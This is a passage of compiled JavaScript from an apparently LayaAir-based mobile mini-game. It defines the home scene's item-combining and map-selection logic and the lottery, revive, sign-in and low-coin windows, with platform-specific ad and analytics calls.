            this.posX = 0;
            this.disX = 0;
        }
        bindChild() {
            super.bindChild();
            this.start_btn = this.getButton("n21.start");
            this.start_btn2 = this.getButton("n21.start2");
            this.startCom = this.getComp("n21");
            this.scenePos = this.getComp("n26");
            this.materialList = this.getList("n21.n13.n25");
            this.book_bt = this.getButton("n22");
            this.hammer_bt = this.getButton("n23");
            this.materialList.numItems = Game.Datas.maxMaterial;
            this.flyClip = this.getMovieClip("n27");
            this.composeClip = this.getMovieClip("n28");
            this.mapNameLabel = this.getLoader('n21.n11');
            this.grailLabel = this.getLabel('n21.n30');
            this.setMapCom = this.getComp("n21.n36");
            this.composeHand = this.getComp("n29");
            this.addDeskop = this.getButton("n30");
            this.manygame_btn = this.getButton("n31");
            this.setMapCom.on(Laya.Event.MOUSE_DOWN, this, this.touchStart);
            this.scenePos.on(Laya.Event.MOUSE_DOWN, this, this.playerOn);
            this.scenePos.on(Laya.Event.MOUSE_MOVE, this, this.playerMove);
            this.scenePos.on(Laya.Event.MOUSE_UP, this, this.playerEnd);
            for (let i = 0; i < this.setMapCom.numChildren; i++) {
                this.mappos.push(i * -720);
            }
            ;
            new Game.HomeHummer(this.startCom).bindChild();
            Game.SoundManager.playBGM(Game.SoundManager.soundName.Audio_bgm_main, true);
            if (Game.platMgr.plat.platType == Game.PlatType.oppo || Game.platMgr.plat.platType == Game.PlatType.vivo) {
                this.getController("oppo").selectedIndex = 1;
                if (Game.platMgr.plat.platType == Game.PlatType.vivo) {
                    this.manygame_btn.visible = false;
                }
            }
            else {
                this.getController("oppo").selectedIndex = 0;
            }
            this.addDeskop.visible = ConfigMgr.adddesk_switch == 1;
            mvc.on(ConfigMgr.closeAddDesk, this, () => {
                this.addDeskop.visible = false;
            });
            if (Game.platMgr.plat.platType == Game.PlatType.pt4399) {
                this.isFullScreen = ConfigMgr.fixedWidth == 1;
                this.isCenter = true;
            }
        }
        onClickButton(btn) {
            if (this.iscompose)
                return;
            if (this.isstart)
                return;
            if (this.isbianshen)
                return;
            super.onClickButton(btn);
            Game.SoundManager.playSound(Game.SoundManager.soundName.Audio_ui_click);
            k7.xsdk.agentManager.getAnalyticsGroup().onButtonClick({
                button_name: String(btn.name),
                button_path: "HomeScene",
            });
            switch (btn) {
                case this.start_btn:
                    if (Game.platMgr.plat.platType == Game.PlatType.vivo) {
                        Game.VivoPlat.hidePortalAd();
                    }
                    Game.hammerChange = 0;
                    this.lastSelect = 0;
                    this.isstart = true;
                    this.firstMaterial();
                    this.startCom.getController("c3").selectedIndex = 0;
                    Game.GameManager.instance.SceneManager.initHamer();
                    mvc.send(GameEvt.HomeHummerRefresh);
                    if (Game.GameCfg.plat == Game.PlatType.wx) {
                        Game.MultiPlatforms.hideCustom1();
                        Game.MultiPlatforms.hideCustom2();
                    }
                    Game.GameManager.instance.SceneManager.playerFly(() => {
                        Game.SoundManager.playSound(Game.SoundManager.soundName.Audio_open_door);
                        this.getTransition("t1").play(Laya.Handler.create(this, () => {
                        }));
                    }, false);
                    break;
                case this.start_btn2:
                    if (this.start_btn2.grayed)
                        return;
                    if (Game.platMgr.plat.platType == Game.PlatType.vivo) {
                        Game.VivoPlat.hidePortalAd();
                    }
                    Game.hammerChange = 0;
                    this.lastSelect = 0;
                    this.isstart = true;
                    this.firstMaterial();
                    this.startCom.getController("c3").selectedIndex = 0;
                    Game.GameManager.instance.SceneManager.initHamer();
                    mvc.send(GameEvt.HomeHummerRefresh);
                    ConfigMgr.Map_Name = Arena[this.selectIndex].id;
                    ConfigMgr.Map = Arena[this.selectIndex].name;
                    ConfigMgr.nowLand = this.selectIndex;
                    ConfigMgr.obstacleName = Game.GameManager.instance.SceneManager.treeNames[ConfigMgr.nowLand];
                    if (Game.GameCfg.plat == Game.PlatType.wx) {
                        Game.MultiPlatforms.hideCustom1();
                        Game.MultiPlatforms.hideCustom2();
                    }
                    Game.GameManager.instance.SceneManager.playerFly(() => {
                        Game.SoundManager.playSound(Game.SoundManager.soundName.Audio_open_door);
                        this.getTransition("t1").play(Laya.Handler.create(this, () => {
                        }));
                    }, false);
                    break;
                case this.book_bt:
                    if (Game.GameCfg.plat == Game.PlatType.wx) {
                        Game.MultiPlatforms.hideCustom1();
                        Game.MultiPlatforms.hideCustom2();
                    }
                    if (ConfigMgr.firstGame == 1) {
                        ConfigMgr.firstGame = 0;
                        this.getController("c5").selectedIndex = 0;
                    }
                    this.lastSelect = this.startCom.getController("c1").selectedIndex;
                    k7.AppScene.show(Game.BookScene);
                    break;
                case this.hammer_bt:
                    if (this.getController("c4").selectedIndex == 0) {
                        this.firstMaterial();
                        this.startCom.getController("c1").selectedIndex = 2;
                        if (Game.hammerChange == 0) {
                            this.getController("c4").selectedIndex = 1;
                        }
                        else if (Game.hammerChange == 1) {
                            this.getController("c4").selectedIndex = 2;
                        }
                        this.startCom.getController("c3").selectedIndex = 0;
                        mvc.send(GameEvt.HomeHummerRefresh);
                    }
                    else {
                        this.getController("c4").selectedIndex = 0;
                        this.startCom.getController("c1").selectedIndex = Game.hammerChange;
                    }
                    break;
                case this.addDeskop:
                    k7.AppWindow.show(Game.AddWindow);
                    break;
                case this.manygame_btn:
                    Game.PlatAdUtil.showPortalAd();
                    break;
            }
        }
        onShown() {
            super.onShown();
            console.log("开始界面");


            if (typeof sdk !== 'undefined' && sdk.showBanner !== 'undefined') {
            sdk.showBanner();
            }
            
            this.isstart = false;
            this.isfirstClick = false;
            this.iscompose = false;
            k7.xsdk.agentManager.getAnalyticsGroup().onWindowShow({
                window_name: "HomeScene",
                window_path: "fast",
            });
            this.getTransition("t2").play();
            this.startCom.getController("c2").selectedIndex = 0;
            Laya.timer.frameOnce(1, this, () => {
                let num = this.scenePos._parent._height - 1280;
                let localY = num / 350;
                let addSize = 2 - num / 560;
                Game.GameManager.instance.SceneManager.home_Player(addSize, localY, this.scenePos.displayObject);
            });
            this.sortMaterial();
            this.materialList.numItems = Game.Datas.maxMaterial;
            this.getController("c2").selectedIndex = 0;
            this.materialList.scrollPane.setPercX(0.5);
            let shock = 0;
            for (let i = Arena.length - 1; i >= 0; i--) {
                if (Game.Datas.grailNum >= Arena[i].grailNum) {
                    ConfigMgr.Map_Name = Arena[i].id;
                    this.startCom.getController("c4").selectedIndex = i;
                    this.grailLabel.text = Game.Datas.grailNum.toString();
                    shock = i;
                    this.setMapCom.x = this.mappos[i];
                    this.selectIndex = shock;
                    ConfigMgr.nowLand = this.selectIndex;
                    ConfigMgr.obstacleName = Game.GameManager.instance.SceneManager.treeNames[ConfigMgr.nowLand];
                    break;
                }
            }
            this.getLabel('n21.n39').text = "0";
            for (let i = 0; i < this.setMapCom.numChildren; i++) {
                if (i <= shock) {
                    this.setMapCom.getChildAt(i).asCom.getController("c1").selectedIndex = 0;
                }
                else {
                    this.setMapCom.getChildAt(i).asCom.getController("c1").selectedIndex = 1;
                }
            }
            this.startCom.getController("c1").selectedIndex = this.lastSelect;
            if (!this.isfirst) {
                this.isfirst = true;
                let icon = this.materialList.getChildAt(2).asCom.getChild("icon").asLoader;
                let pos = icon.localToGlobal();
                pos.x += (this.composeHand.width) / 2;
                pos.y += (this.composeHand.height) / 2;
                this.firstPos = new Laya.Vector2(pos.x - 52, pos.y - 72);
                let icon2 = this.materialList.getChildAt(3).asCom.getChild("icon").asLoader;
                let pos2 = icon2.localToGlobal();
                pos2.x += (this.composeHand.width) / 2;
                pos2.y += (this.composeHand.height) / 2;
                this.secondPos = new Laya.Vector2(pos2.x - 52, pos2.y - 72);
                this.firstFloor = this.getImage("n21.n12").localToGlobal();
                this.firstFloor.x += 130 - this.viewComponent.localToGlobal().x;
                this.firstFloor.y += 86 - this.viewComponent.localToGlobal().y;
                this.secondFloor.x = this.firstFloor.x;
                this.secondFloor.x += 250;
                this.secondFloor.y = this.firstFloor.y;
            }
            if (this.startCom.getController("c1").selectedIndex == 0 && ConfigMgr.firstGame == 1 && this.isjiao == false) {
                this.getController("c5").selectedIndex = 1;
                this.isjiao = true;
                this.composeHand.setXY(this.firstPos.x, this.firstPos.y);
                k7.xsdk.agentManager.getAnalyticsGroup().onGuideStep({
                    guide_id: "001",
                    guide_type: "compose"
                });
            }
            else {
                this.getController("c5").selectedIndex = 0;
            }
            if (Game.GameCfg.plat == Game.PlatType.wx) {
                Game.MultiPlatforms.hideCustom1();
                Game.MultiPlatforms.hideCustom2();
                Game.MultiPlatforms.createCustom1("home");
                Game.MultiPlatforms.createCustom2("home");
            }
            else if (Game.platMgr.plat.platType == Game.PlatType.mz) {
                if (Game.gameSwitch == 1) {
                    Laya.timer.once(1000, this, () => {
                        Game.PlatAdUtil.showInterAd();
                    });
                }
            }
            if (Game.platMgr.plat.platType == Game.PlatType.oppo || Game.platMgr.plat.platType == Game.PlatType.vivo) {
                this.getController("oppo").selectedIndex = 1;
                if (ConfigMgr.longPhone == 0) {
                    Game.PlatAdUtil.hideBannerAd();
                }
                if (Game.platMgr.plat.platType == Game.PlatType.vivo) {
                    Game.VivoPlat.showPortalAd();
                }
            }
            else {
                Game.PlatAdUtil.hideBannerAd();
            }
        }
        onHide() {
            super.onHide();
            Game.Datas.setData();
            for (let index = 0; index < Game.Datas.newMaterial.length; index++) {
                Game.Datas.newMaterial[index] = 0;
            }
            if (ConfigMgr.firstGame == 1) {
                ConfigMgr.firstGame = 0;
                this.getController("c5").selectedIndex = 0;
                this.startCom.getController("c3").selectedIndex = 0;
            }
        }
        hide() {
            super.hide();
        }
        onListRenderer(items, index) {
            let icon = items.getLoader("icon");
            let title = items.getLabel("title");
            let itemName = "";
            if (this.sortArr.length == 0)
                return;
            itemName = Item[this.sortArr[index]].id;
            icon.url = "ui://icon/" + Item[this.sortArr[index]].icon;
            title.text = "" + Game.Datas.getMaterial[this.sortArr[index]];
            if (Game.Datas.getMaterial[this.sortArr[index]] == 0) {
                items.getController("c1").selectedIndex = 1;
            }
            else {
                if (this.firstName == "") {
                    if (Game.Datas.newMaterial[this.sortArr[index]] == 0) {
                        items.getController("c1").selectedIndex = 0;
                    }
                    else {
                        items.getController("c1").selectedIndex = 2;
                    }
                }
                else {
                    let ishave = false;
                    for (let i = 0; i < this.secondName.length; i++) {
                        if (this.secondName[i] == itemName || this.secondName[i] == null) {
                            ishave = true;
                            break;
                        }
                    }
                    if (!ishave) {
                        items.getController("c1").selectedIndex = 1;
                    }
                    else {
                        if (Game.Datas.newMaterial[this.sortArr[index]] == 0) {
                            items.getController("c1").selectedIndex = 0;
                        }
                        else {
                            items.getController("c1").selectedIndex = 2;
                        }
                    }
                }
            }
        }
        onClickItem(item) {
            if (Game.Datas.getMaterial[this.sortArr[this.materialList.selectedIndex]] > 0) {
                let icon = item.getLoader("icon");
                let pos = icon.localToGlobal();
                Game.SoundManager.playSound(Game.SoundManager.soundName.Audio_item_select);
                this.TweenMaterial(icon.url, new Laya.Vector2(pos.x, pos.y), this.sortArr[this.materialList.selectedIndex], icon);
            }
        }
        TweenMaterial(url, pos, index = 0, icon) {
            if (this.firstCompose == null) {
                this.composeCoin1 = Item[index].costGold;
                if (Game.fast.ecoProxy.checkCoin(this.composeCoin1) == false) {
                    this.composeCoin1 = 0;
                    return;
                }
                this.firstName = Item[index].id;
                this.getSecondName();
                this.firstCompose = new GLoader();
                this.firstCompose.url = url;
                this.firstCompose.autoSize = true;
                this.firstCompose.setPivot(0.5, 0.5, true);
                this.firstCompose.setScale(1.3, 1.3);
                this.viewComponent._children[0].asCom.addChild(this.firstCompose);
                pos.x += (this.firstCompose.width * 1.3) / 2;
                pos.y += (this.firstCompose.height * 1.3) / 2;
                this.firstStartPos = pos;
                this.firstIndex = index;
                this.firstCompose.setXY(pos.x, pos.y);
                Game.Datas.getMaterial[index] -= 1;
                this.materialList.numItems = Game.Datas.maxMaterial;
                if (ConfigMgr.firstGame == 1) {
                    this.nextHandAction();
                }
                let isclick = false;
                Laya.Tween.to(this.firstCompose, { x: this.firstFloor.x, y: this.firstFloor.y }, 300, null);
                this.firstCompose.on(Laya.Event.CLICK, this, () => {
                    if (isclick)
                        return;
                    isclick = true;
                    this.isfirstClick = true;
                    let startpos = icon.localToGlobal();
                    startpos.x += (this.firstCompose.width * 1.3) / 2;
                    startpos.y += (this.firstCompose.height * 1.3) / 2;
                    Laya.Tween.to(this.firstCompose, { x: startpos.x, y: startpos.y }, 300, null, Laya.Handler.create(this, () => {
                        this.firstCompose.dispose();
                        Game.Datas.getMaterial[index] += 1;
                        this.firstName = "";
                        this.secondName = [];
                        this.modelName = [];
                        this.firstCompose = null;
                        this.isfirstClick = false;
                        this.materialList.numItems = Game.Datas.maxMaterial;
                    }));
                });
            }
            else {
                if (this.secondCompose == null) {
                    this.composeCoin2 = Item[index].costGold;
                    if (Game.fast.ecoProxy.checkCoin(this.composeCoin2) == false) {
                        this.composeCoin2 = 0;
                        return;
                    }
                    let nowclickName = "";
                    nowclickName = Item[index].id;
                    let ishave = false;
                    let modelIndex = 0;
                    for (let i = 0; i < this.secondName.length; i++) {
                        if (this.secondName[i] == nowclickName || this.secondName[i] == null) {
                            ishave = true;
                            modelIndex = i;
                            break;
                        }
                    }
                    if (ishave) {
                        this.isbianshen = true;
                        this.iscompose = true;
                        this.secondCompose = new GLoader();
                        this.secondCompose.url = url;
                        this.secondCompose.autoSize = true;
                        this.secondCompose.setPivot(0.5, 0.5, true);
                        this.secondCompose.setScale(1.3, 1.3);
                        this.viewComponent._children[0].asCom.addChild(this.secondCompose);
                        pos.x += (this.secondCompose.width * 1.3) / 2;
                        pos.y += (this.secondCompose.height * 1.3) / 2;
                        this.secondCompose.setXY(pos.x, pos.y);
                        Game.Datas.getMaterial[index] -= 1;
                        this.materialList.numItems = Game.Datas.maxMaterial;
                        Laya.Tween.to(this.secondCompose, { x: this.secondFloor.x, y: this.secondFloor.y }, 300, null, Laya.Handler.create(this, () => {
                            Game.SoundManager.playSound(Game.SoundManager.soundName.Audio_biu);
                            if (ConfigMgr.firstGame == 1) {
                                this.handTween.clear();
                                ConfigMgr.firstGame = 0;
                                this.getController("c5").selectedIndex = 0;
                            }
                            this.Shake(null, this.firstCompose, false);
                            this.Shake(() => {
                                let centerX = (this.firstCompose.x + this.secondCompose.x) / 2;
                                Laya.Tween.to(this.firstCompose, { x: centerX }, 400, Laya.Ease.circOut);
                                Laya.Tween.to(this.secondCompose, { x: centerX }, 400, Laya.Ease.circOut, Laya.Handler.create(this, () => {
                                    Game.MultiPlatforms.vibrateLong();
                                    this.getTransition('t0').play();
                                    this.firstCompose.dispose();
                                    this.secondCompose.dispose();
                                    this.composeClip.rewind();
                                    this.getController("c3").selectedIndex = 1;
                                    Laya.timer.once(1000, this, () => {
                                        this.getController("c3").selectedIndex = 0;
                                        this.firstCompose = null;
                                        this.secondCompose = null;
                                        this.firstName = "";
                                        let mode = this.modelName[modelIndex];
                                        this.secondName = [];
                                        this.modelName = [];
                                        this.startCom.getController("c1").selectedIndex = 1;
                                        Game.hammerChange = 1;
                                        this.iscompose = false;
                                        this.getController("c2").selectedIndex = 1;
                                        this.flyClip.rewind();
                                        this.start_btn2.grayed = true;
                                        Laya.timer.once(1800, this, () => {
                                            for (let i = 0; i < Skin.length; i++) {
                                                if (Skin[i].model == mode) {
                                                    Game.nowSkinIndex = i;
                                                    break;
                                                }
                                            }
                                            if (Game.Datas.skinDatas[Game.nowSkinIndex] != 1) {
                                                Game.Datas.skinDatas[Game.nowSkinIndex] = 1;
                                                Game.Datas.setData();
                                            }
                                            k7.xsdk.agentManager.getAnalyticsGroup().onCustom({
                                                custom_event_name: "composeSkin",
                                                custom_scene_name: "HomeScene",
                                                custom_string: mode
                                            });
                                            Game.fast.ecoProxy.addCoin(-1 * (this.composeCoin1 + this.composeCoin2));
                                            let model = Game.GameManager.instance.SceneManager.setPlayerSkin(mode, Game.GameManager.instance.SceneManager.player);
                                            if (model) {
                                                model.active = true;
                                            }
                                            else {
                                                Game.GameManager.instance.SceneManager.player.getChildByName("player1").active = true;
                                            }
                                        });
                                        Laya.timer.once(2200, this, () => {
                                            this.getController("c2").selectedIndex = 0;
                                        });
                                        Game.SoundManager.playSound(Game.SoundManager.soundName.Audio_change1);
                                        Game.GameManager.instance.SceneManager.composeOver(() => {
                                            if (this.isjiao == true) {
                                                this.startCom.getController("c3").selectedIndex = 1;
                                            }
                                            this.isbianshen = false;
                                            this.start_btn2.grayed = false;
                                        });
                                    });
                                }));
                            }, this.secondCompose, true);
                        }));
                    }
                }
            }
        }
        getSecondName() {
            for (let i = 0; i < Skin.length; i++) {
                if (Skin[i].item1 == this.firstName) {
                    this.secondName.push(Skin[i].item2);
                    this.modelName.push(Skin[i].model);
                }
            }
            for (let i = 0; i < Skin.length; i++) {
                if (Skin[i].item2 == this.firstName) {
                    this.secondName.push(Skin[i].item1);
                    this.modelName.push(Skin[i].model);
                }
            }
        }
        Shake(callback, target, left) {
            let outX = 0;
            let inX = 0;
            let startX = target.x;
            ;
            if (left) {
                outX = target.x + 10;
                inX = target.x - 10;
            }
            else {
                outX = target.x - 10;
                inX = target.x + 10;
            }
            Laya.Tween.to(target, { x: inX }, 50, null, Laya.Handler.create(this, () => {
                Laya.Tween.to(target, { x: outX }, 50, null, Laya.Handler.create(this, () => {
                    Laya.Tween.to(target, { x: inX }, 50, null, Laya.Handler.create(this, () => {
                        Laya.Tween.to(target, { x: startX }, 50, null, Laya.Handler.create(this, () => {
                            if (callback) {
                                callback();
                            }
                        }));
                    }));
                }));
            }));
        }
        sortMaterial() {
            this.sortArr = [];
            let arr = [];
            let originArr = [];
            let newarr = [];
            for (let i = 0; i < Game.Datas.getMaterial.length; i++) {
                arr.push(Game.Datas.getMaterial[i]);
                this.sortArr.push(0);
                newarr.push(0);
                originArr.push(Game.Datas.getMaterial[i]);
            }
            arr.sort(function (a, b) { return b - a; });
            for (let index = 0; index < arr.length; index++) {
                for (let j = 0; j < originArr.length; j++) {
                    if (originArr[j] == arr[index]) {
                        newarr[index] = j;
                        originArr[j] = null;
                        break;
                    }
                }
            }
            let shiftArr = [];
            for (let i = 0; i < Game.Datas.newMaterial.length; i++) {
                for (let j = 0; j < newarr.length; j++) {
                    if (Game.Datas.newMaterial[i] == 1 && i == newarr[j]) {
                        shiftArr.push(newarr[j]);
                        newarr.splice(j, 1);
                    }
                }
            }
            for (let index = 0; index < shiftArr.length; index++) {
                newarr.unshift(shiftArr[index]);
            }
            let leftIndex = 0;
            let rightIndex = 0;
            if (newarr.length % 2 == 0) {
                leftIndex = Math.floor(newarr.length / 2) - 1;
                rightIndex = leftIndex + 1;
            }
            else {
                leftIndex = Math.floor(newarr.length / 2);
                rightIndex = leftIndex + 1;
            }
            for (let m = 0; m < newarr.length; m++) {
                if (m % 2 == 0) {
                    this.sortArr[leftIndex] = newarr[m];
                    leftIndex -= 1;
                }
                else {
                    this.sortArr[rightIndex] = newarr[m];
                    rightIndex += 1;
                }
            }
        }
        firstMaterial() {
            if (this.firstCompose != null && this.isfirstClick == false) {
                if (ConfigMgr.firstGame == 1) {
                    ConfigMgr.firstGame = 0;
                    this.getController("c5").selectedIndex = 0;
                }
                Laya.Tween.to(this.firstCompose, { x: this.firstStartPos.x, y: this.firstStartPos.y }, 300, null, Laya.Handler.create(this, () => {
                    this.firstCompose.dispose();
                    Game.Datas.getMaterial[this.firstIndex] += 1;
                    this.firstName = "";
                    this.secondName = [];
                    this.modelName = [];
                    this.firstCompose = null;
                    this.materialList.numItems = Game.Datas.maxMaterial;
                }));
            }
        }
        touchStart() {
            this.posX = this.setMapCom.displayObject.mouseX;
            this.setMapCom.on(Laya.Event.MOUSE_MOVE, this, this.touchMove);
            this.setMapCom.on(Laya.Event.MOUSE_UP, this, this.touchEnd);
            this.setMapCom.on(Laya.Event.MOUSE_OUT, this, this.touchEnd);
        }
        touchMove() {
            let offsetX = this.setMapCom.displayObject.mouseX - this.posX;
            this.setMapCom.x += offsetX * 1.1;
            this.posX = this.setMapCom.displayObject.mouseX;
        }
        touchEnd() {
            this.setMapCom.off(Laya.Event.MOUSE_MOVE, this, this.touchMove);
            this.setMapCom.off(Laya.Event.MOUSE_UP, this, this.touchEnd);
            this.setMapCom.off(Laya.Event.MOUSE_OUT, this, this.touchEnd);
            this.posX = 0;
            let minIndex = 0;
            if (this.setMapCom.x >= 0) {
                minIndex = 0;
                Laya.Tween.to(this.setMapCom, { x: 0 }, 200, null);
            }
            else if (this.setMapCom.x <= this.mappos[this.mappos.length - 1]) {
                minIndex = this.mappos.length - 1;
                Laya.Tween.to(this.setMapCom, { x: this.mappos[this.mappos.length - 1] }, 200, null);
            }
            else {
                minIndex = this.getNearMap();
                Laya.Tween.to(this.setMapCom, { x: this.mappos[minIndex] }, 200, null);
            }
            if (this.setMapCom.getChildAt(minIndex).asCom.getController("c1").selectedIndex == 1) {
                this.start_btn2.grayed = true;
                this.getLabel('n21.n39').text = "" + Arena[minIndex].grailNum;
                this.startCom.getController("c2").selectedIndex = 1;
            }
            else {
                if (this.iscompose == false) {
                    this.start_btn2.grayed = false;
                }
                this.startCom.getController("c2").selectedIndex = 0;
                this.getLabel('n21.n39').text = "0";
            }
            this.selectIndex = minIndex;
            this.startCom.getController("c4").selectedIndex = minIndex;
        }
        getNearMap() {
            let minX = null;
            let minIndex = 0;
            for (let i = 0; i < this.mappos.length; i++) {
                let disX = Math.abs(this.setMapCom.x - this.mappos[i]);
                if (minX == null || disX < minX) {
                    minX = disX;
                    minIndex = i;
                }
            }
            return minIndex;
        }
        playerOn() {
            this.disX = this.scenePos.displayObject.mouseX;
        }
        playerMove() {
            let offsetX = this.scenePos.displayObject.mouseX - this.disX;
            Game.GameManager.instance.SceneManager.player.transform.localRotationEulerY += offsetX;
            if (Game.GameManager.instance.SceneManager.player.transform.localRotationEulerY > 360) {
                Game.GameManager.instance.SceneManager.player.transform.localRotationEulerY = 0;
            }
            else if (Game.GameManager.instance.SceneManager.player.transform.localRotationEulerY < 0) {
                Game.GameManager.instance.SceneManager.player.transform.localRotationEulerY = 360;
            }
            this.disX = this.scenePos.displayObject.mouseX;
        }
        playerEnd() {
            this.disX = 0;
        }
        handAction(startPos, endPos, target, str) {
            this.handTween.to(target, { x: endPos.x, y: endPos.y }, 500, null, Laya.Handler.create(this, () => {
                this.handTween.to(target, { x: startPos.x, y: startPos.y }, 500, null, Laya.Handler.create(this, () => {
                    this.handAction(startPos, endPos, target, str);
                }));
            }));
        }
        nextHandAction() {
            console.log("aaa");
            this.handTween.clear();
            let pos;
            if (this.firstName == "it05") {
                pos = this.firstPos;
            }
            else {
                pos = this.secondPos;
            }
            this.composeHand.setXY(pos.x, pos.y);
            k7.xsdk.agentManager.getAnalyticsGroup().onGuideStep({
                guide_id: "002",
                guide_type: "compose"
            });
        }
    }
    Game.MyHomeScene = MyHomeScene;
    passer.plugin.fast.HomeScene = MyHomeScene;
})(Game || (Game = {}));
var Game;
(function (Game) {
    class MyLotteryWindow extends passer.plugin.fast.LotteryWindow {
        constructor() {
            super();
        }
        bindChild() {
            super.bindChild();
            this.reward_bt = this.getButton("next");
            this.closeBtn = this.getButton("closeButton");
            if (Game.platMgr.plat.platType == Game.PlatType.pt4399) {
                this.isFullScreen = ConfigMgr.fixedWidth == 1;
            }
        }
        onClickButton(btn) {
            super.onClickButton(btn);
            if (btn === this.closeBtn) {
                this.hide();
            }
            Game.SoundManager.playSound(Game.SoundManager.soundName.Audio_ui_click);
            k7.xsdk.agentManager.getAnalyticsGroup().onButtonClick({
                button_name: String(btn.name),
                button_path: "LotteryWindow",
            });
        }
        onClickRewardButton() {
            Game.rpMgr.getReward(Game.RewardPointId.Luck, this.onRewardSuccess.bind(this), this.onRewardFailed.bind(this));
        }
        refreshUi() {
            super.refreshUi();
            Game.rpMgr.setUIController(Game.RewardPointId.Luck, this.rewardButton.getController("c1"));
        }
        onShown() {
            super.onShown();
            k7.xsdk.agentManager.getAnalyticsGroup().onWindowShow({
                window_name: "LotteryWindow",
                window_path: "fast",
            });
            Game.PlatAdUtil.showBannerAd();
            if (Game.platMgr.plat.platType == Game.PlatType.oppo || Game.platMgr.plat.platType == Game.PlatType.vivo) {
                this.getController("oppo").selectedIndex = 1;
            }
            else {
                this.getController("oppo").selectedIndex = 0;
            }
        }
        onNext() {
            super.onNext();
            Game.SoundManager.playSound(Game.SoundManager.soundName.Audio_luck_draw);
        }
        onHide() {
            super.onHide();
            if (Game.platMgr.plat.platType == Game.PlatType.oppo || Game.platMgr.plat.platType == Game.PlatType.vivo) {
                if (ConfigMgr.longPhone == 0) {
                    Game.PlatAdUtil.hideBannerAd();
                }
            }
            else {
                Game.PlatAdUtil.hideBannerAd();
            }
        }
    }
    Game.MyLotteryWindow = MyLotteryWindow;
    passer.plugin.fast.LotteryWindow = MyLotteryWindow;
})(Game || (Game = {}));
var Game;
(function (Game) {
    class MyNotEnoughWindow extends passer.plugin.fast.NotEnoughWindow {
        constructor() {
            super();
        }
        bindChild() {
            super.bindChild();
            console.log("金币不足");
        }
        onClickButton(btn) {
            super.onClickButton(btn);
        }
        refreshUi() {
            super.refreshUi();
            Game.rpMgr.setUIController(Game.RewardPointId.NotEnough, this.rewardButton.getController("c1"));
        }
        onClickRewardButton() {
            Game.rpMgr.getReward(Game.RewardPointId.NotEnough, this.onRewardSuccess.bind(this), this.onRewardFailed.bind(this));
        }
        onShown() {
            super.onShown();
            this.getController("c4").selectedIndex = 1;
            mvc.send(GameEvt.BookCoinRefresh);
            if (Game.platMgr.plat.platType == Game.PlatType.oppo || Game.platMgr.plat.platType == Game.PlatType.vivo) {
                this.getController("oppo").selectedIndex = 1;
            }
            else {
                this.getController("oppo").selectedIndex = 0;
            }
        }
        onHide() {
            super.onHide();
        }
        onReward() {
            super.onReward();
            this.hide();
        }
    }
    Game.MyNotEnoughWindow = MyNotEnoughWindow;
    passer.plugin.fast.NotEnoughWindow = MyNotEnoughWindow;
})(Game || (Game = {}));
var Game;
(function (Game) {
    class MyReviveWindow extends passer.plugin.fast.GameReviveWindow {
        constructor() {
            super();
        }
        bindChild() {
            super.bindChild();
            this.home_bt = this.getButton("home");
            this.reviveTween = new Laya.Tween();
            this.home_bt.visible = false;
        }
        onClickButton(btn) {
            super.onClickButton(btn);
            Game.SoundManager.playSound(Game.SoundManager.soundName.Audio_ui_click);
            k7.xsdk.agentManager.getAnalyticsGroup().onButtonClick({
                button_name: String(btn.name),
                button_path: "ReviveWindow",
            });
            switch (btn) {
                case this.home_bt:
                    Game.GameManager.instance.GameStart.GameInit();
                    break;
            }
        }
        onNext() {
            Game.ViewManager.showSuccessScene();
        }
        onReward() {
            super.onReward();
            this.hide();
            Game.GameManager.instance.PlayerMove.reviveFun();
            Game.PlatAdUtil.hideBannerAd();
        }
        refreshUi() {
            super.refreshUi();
            this.getController("c4").selectedIndex = 1;
            Game.rpMgr.setUIController(Game.RewardPointId.Revive, this.rewardButton.getController("c1"));
        }
        onShown() {
            super.onShown();
            Game.PlatAdUtil.showBannerAd();
            Game.MultiPlatforms.vibrateLong();
            if (Game.platMgr.plat.platType == Game.PlatType.oppo || Game.platMgr.plat.platType == Game.PlatType.vivo) {
                this.getController("oppo").selectedIndex = 1;
            }
            else {
                this.getController("oppo").selectedIndex = 0;
            }
            if (Game.platMgr.plat.platType == Game.PlatType.mz) {
                if (Game.gameSwitch == 1) {
                    Laya.timer.once(1000, this, () => {
                        Game.PlatAdUtil.showInterAd();
                    });
                }
            }
        }
        onHide() {
            super.onHide();
            Laya.timer.clearAll(this);
        }
        onTimeStep() {
            super.onTimeStep();
            this.reviveTween.to(this.infoLdr.component.getChild("n15").asProgress, { value: this._time / FastConst.reviveTime.v * 100 }, 1000);
        }
        onClickRewardButton() {
            Laya.timer.pause();
            this.reviveTween.pause();
            Game.rpMgr.getReward(Game.RewardPointId.Revive, this.onRewardSuccess.bind(this), this.onRewardFailed.bind(this));
        }
        onRewardFailed() {
            super.onRewardFailed();
            Laya.timer.resume();
            this.reviveTween.resume();
        }
        hide() {
            super.hide();
            Laya.timer.resume();
            this.reviveTween.resume();
            this.reviveTween.clear();
        }
    }
    Game.MyReviveWindow = MyReviveWindow;
    passer.plugin.fast.GameReviveWindow = MyReviveWindow;
})(Game || (Game = {}));
var Game;
(function (Game) {
    class MySignWindow extends passer.plugin.fast.SignWindow {
        constructor() {
            super();
            this.signlocal = 0;
        }
        bindChild() {
            super.bindChild();
            this.next = this.getButton("next");
            this.closeBtn = this.getButton("closeButton");
            let local = Laya.LocalStorage.getItem("fast.sign");
            if (!local) {
                this.signlocal = 0;
            }
            else {
                this.signlocal = JSON.parse(local).day;
            }
        }
        onClickButton(btn) {
            super.onClickButton(btn);
            k7.xsdk.agentManager.getAnalyticsGroup().onButtonClick({
                button_name: String(btn.name),
                button_path: "SignWindow",
            });
            Game.SoundManager.playSound(Game.SoundManager.soundName.Audio_ui_click);
            switch (btn) {
                case this.next:
                    Game.MultiPlatforms.showToast("Get Coins:" + FastSign[this.signlocal].val);
                    console.log(FastSign[this.signlocal].val);
                    break;
                case this.closeBtn:
                    this.hide();
                    break;
            }
        }
        onClickRewardButton() {
            Game.rpMgr.getReward(Game.RewardPointId.RigisterDouble, this.onRewardSuccess.bind(this), this.onRewardFailed.bind(this));
        }
        refreshUi() {
            super.refreshUi();
            Game.rpMgr.setUIController(Game.RewardPointId.RigisterDouble, this.rewardButton.getController("c1"));
        }
        onShown() {
            super.onShown();
            Game.PlatAdUtil.showBannerAd();
            k7.xsdk.agentManager.getAnalyticsGroup().onWindowShow({
                window_name: "SignWindow",
                window_path: "fast",
            });
            if (Game.GameCfg.plat == Game.PlatType.wx) {
                Game.MultiPlatforms.hideCustom1();
                Game.MultiPlatforms.hideCustom2();
                Game.MultiPlatforms.createCustom1("sign");
                Game.MultiPlatforms.createCustom2("sign");
            }
